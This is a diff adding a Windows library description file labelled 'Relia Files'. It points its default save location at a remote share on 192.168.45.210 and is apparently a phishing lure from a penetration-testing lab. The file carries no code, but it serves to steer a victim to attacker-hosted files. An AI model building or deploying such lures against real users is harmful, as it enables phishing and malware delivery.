@@ -1,0 +1,20 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
+  <name>@windows.storage.dll,-34582</name>
+  <version>6</version>
+  <isLibraryPinned>true</isLibraryPinned>
+  <iconReference>imageres.dll,-100</iconReference>
+  <templateInfo>
+    <folderType>{7D49D726-3C21-4F05-99AA-FDC2C9474656}</folderType>
+  </templateInfo>
+  <searchConnectorDescriptionList>
+    <searchConnectorDescription>
+      <description>Relia Files</description>
+      <isDefaultSaveLocation>true</isDefaultSaveLocation>
+      <isDefaultNonOwnerSaveLocation>true</isDefaultNonOwnerSaveLocation>
+      <simpleLocation>
+        <url>http://192.168.45.210/</url>
+      </simpleLocation>
+    </searchConnectorDescription>
+  </searchConnectorDescriptionList>
+</libraryDescription>
